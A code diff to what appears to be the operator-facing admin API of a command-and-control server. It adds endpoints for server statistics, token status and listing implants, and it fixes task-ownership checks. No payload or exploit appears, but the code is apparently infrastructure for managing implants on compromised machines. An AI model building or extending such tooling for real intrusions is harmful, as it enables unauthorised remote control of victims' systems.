@@ -62,6 +62,34 @@ def verified(func):
     return wrapper
 
 
+@admin.route(
+    ROUTES["operator"]["stats"]["path"],
+    methods=ROUTES["operator"]["stats"]["methods"],
+)
+@verified
+def server_stats(operator: Operator) -> Any:
+    """
+    Get basic statistics about the server
+    """
+    # Get number of implants, number of active tasks, total number of tasks
+    # number of operators
+    num_implants = Implant.query.count()
+    num_active_tasks = Task.query.filter_by(
+        operator_name=operator.username, status="active"
+    ).count()
+    num_total_tasks = Task.query.filter_by(operator_name=operator.username).count()
+    num_operators = Operator.query.count()
+
+    return jsonify(
+        {
+            "status": True,
+            "implants": num_implants,
+            "active_tasks": num_active_tasks,
+            "total_tasks": num_total_tasks,
+            "operators": num_operators,
+        }
+    )
+
 # @admin.route("/op/auth/token/request", methods=["GET"])  # type: ignore
 @admin.route(
     ROUTES["operator"]["request_auth_token"]["path"],
@@ -152,6 +180,15 @@ def revoke_token(operator: Operator) -> Any:
     db.session.commit()
     return jsonify({"status": True}), 200
 
+@admin.route(
+    ROUTES["operator"]["auth_token_status"]["path"],
+    methods=ROUTES["operator"]["auth_token_status"]["methods"],
+)
+def token_status() -> Any:
+    operator = verify_auth_token(request)
+    if operator is None:
+        return jsonify({"status": False, "msg": "Not authenticated"}), 401
+    return jsonify({"status": True, "msg": "Authenticated"}), 200
 
 # @admin.route("/op/tasks/list", methods=["GET"])  # type: ignore
 @admin.route(
@@ -163,7 +200,7 @@ def list_tasks(operator: Operator) -> Any:
     """
     Get a list of tasks issued by this operator
     """
-    tasks = Task.query.filter_by(operator_id=operator.username).all()
+    tasks = Task.query.filter_by(operator_name=operator.username).all()
     return jsonify({"status": True, "tasks": [x.toJSON() for x in tasks]}), 200
 
 
@@ -224,7 +261,7 @@ def get_task_result(operator: Operator, task_id: str) -> Any:
     if task is None:
         return jsonify({"status": False, "msg": "Unknown task"}), 400
 
-    if task.operator_id != operator.username:
+    if task.operator_name != operator.username:
         return jsonify({"status": False, "msg": "Unauthorized"}), 401
 
     return jsonify({"status": True, "result": task.output}), 200
@@ -242,10 +279,20 @@ def delete_task(operator: Operator, task_id: str) -> Any:
     if task is None:
         return jsonify({"status": False, "msg": "Unknown task"}), 400
 
-    if task.operator_id != operator.username:
+    if task.operator_name != operator.username:
         return jsonify({"status": False, "msg": "Unauthorized"}), 401
 
     db.session.delete(task)
     db.session.commit()
 
     return jsonify({"status": True}), 200
+
+
+@admin.route(ROUTES["operator"]["list_implants"]["path"], methods=ROUTES["operator"]["list_implants"]["methods"])
+@verified
+def list_implants(operator: Operator) -> Any:
+    """
+    Get a list of all implants
+    """
+    implants = Implant.query.all()
+    return jsonify({"status": True, "implants": [x.toJSON() for x in implants]}), 200
